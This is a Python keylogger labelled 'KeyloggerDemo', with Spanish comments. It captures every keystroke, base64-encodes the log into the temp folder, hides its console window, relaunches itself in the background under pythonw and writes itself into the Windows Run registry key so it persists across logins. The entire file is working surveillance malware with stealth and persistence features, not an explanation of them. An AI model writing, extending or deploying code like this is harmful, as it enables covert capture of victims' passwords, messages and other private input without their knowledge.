#!/usr/bin/env python3

from pynput import keyboard
import os
import time
from datetime import datetime
import threading
import tempfile
import base64
import winreg
import subprocess
import sys

class KeyloggerDemo:
    def __init__(self, output_directory):
        """
        Args:
            output_directory (str): Directorio donde se guardarán los logs
            esto es keylogger
        """
        self.output_directory = tempfile.gettempdir()
        self.log_buffer = []
        self.running = True
        
        # Nombre del archivo con timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.log_file = os.path.join(self.output_directory, f"registro_{timestamp}.txt")
        
        print(f"iniciado")
        print(f"[+] Los logs se guardarán en: {self.log_file}")
        print(f"[+] Guardado automático cada 2 minutos")
        print(f"[+] Presiona ESC para detener el keylogger\n")
        
        # Escribir encabezado en el archivo
        with open(self.log_file, 'w', encoding='utf-8') as f:
            header = "=" * 50 + "\n"
            header += f"Inicio: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            header += "=" * 50 + "\n\n"
            f.write(base64.b64encode(header.encode()).decode())
    
    def on_press(self, key):
        """
        Callback que se ejecuta cuando se presiona una tecla
        
        Args:
            key: La tecla presionada
        """
        try:
            # Registrar teclas alfanuméricas
            timestamp = datetime.now().strftime("%H:%M:%S")
            key_char = key.char
            log_entry = f"[{timestamp}] {key_char}"
            self.log_buffer.append(log_entry)
            print(f"Tecla capturada: {key_char}")
            
        except AttributeError:
            # Teclas especiales (Shift, Ctrl, etc.)
            timestamp = datetime.now().strftime("%H:%M:%S")
            key_name = str(key).replace("Key.", "")
            log_entry = f"[{timestamp}] <{key_name}>"
            self.log_buffer.append(log_entry)
            print(f"Tecla especial: {key_name}")
            
            # Detener si se presiona ESC
            if key == keyboard.Key.esc:
                print("\n[!] ESC presionado. Deteniendo...")
                self.save_logs()
                self.running = False
                return False
    
    def save_logs(self):
        """
        Guarda los logs acumulados en el buffer al archivo
        """
        if self.log_buffer:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                for log_entry in self.log_buffer:
                    encoded = base64.b64encode(log_entry.encode()).decode()
                    f.write(encoded + '\n')
            
            print(f"\n[+] {len(self.log_buffer)} teclas guardadas en {self.log_file}")
            self.log_buffer.clear()
        else:
            print("\n[*] No hay nuevas teclas para guardar")
    
    def auto_save(self):
        """
        Guarda automáticamente los logs cada 2 minutos
        """
        while self.running:
            time.sleep(120)  # 2 minutos = 120 segundos
            if self.running:  # Verificar que aún está corriendo
                print("\n[*] Guardado automático...")
                self.save_logs()
    
    def start(self):
        """
        Inicia
        """
        # Iniciar hilo de guardado automático
        save_thread = threading.Thread(target=self.auto_save, daemon=True)
        save_thread.start()
        
        # Iniciar
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()
        
        # Guardar logs finales al terminar
        print("\n[+] Guardando logs finales...")
        self.save_logs()
        
        # Escribir footer
        with open(self.log_file, 'a', encoding='utf-8') as f:
            footer = "\n" + "=" * 50 + "\n"
            footer += f"Fin: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            footer += "=" * 50 + "\n"
            f.write(base64.b64encode(footer.encode()).decode())
        
        print(f"[+]Detenido. Logs guardados en: {self.log_file}")


def add_to_startup():
    """
    Agrega el script al registro de Windows para ejecutarse al iniciar
    """
    try:
        script_path = os.path.abspath(sys.argv[0])
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "KeyloggerDemo", 0, winreg.REG_SZ, f'pythonw.exe "{script_path}"')
        winreg.CloseKey(key)
    except Exception as e:
        pass


def main():

    # Ocultar ventana de CMD
    if sys.platform == 'win32':
        import ctypes
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    
    # Agregar al registro para ejecutarse al iniciar
    add_to_startup()

    # Solicitar directorio de salida
    output_dir = tempfile.gettempdir()
    
    if not output_dir:
        return
    
    # Instalar dependencias si es necesario
    print("\n[*] Verificando dependencias...")
    try:
        import pynput
    except ImportError:
        print("[!] Instalando pynput...")
        os.system("pip install pynput --break-system-packages")
    
    # Iniciar keylogger
    keylogger = KeyloggerDemo(output_dir)
    keylogger.start()


if __name__ == "__main__":
    # Si se ejecuta como pythonw, ejecutar en segundo plano
    if 'pythonw' not in sys.executable.lower():
        # Relanzar con pythonw para ocultarse
        subprocess.Popen([sys.executable.replace('python.exe', 'pythonw.exe')] + sys.argv)
    else:
        main()
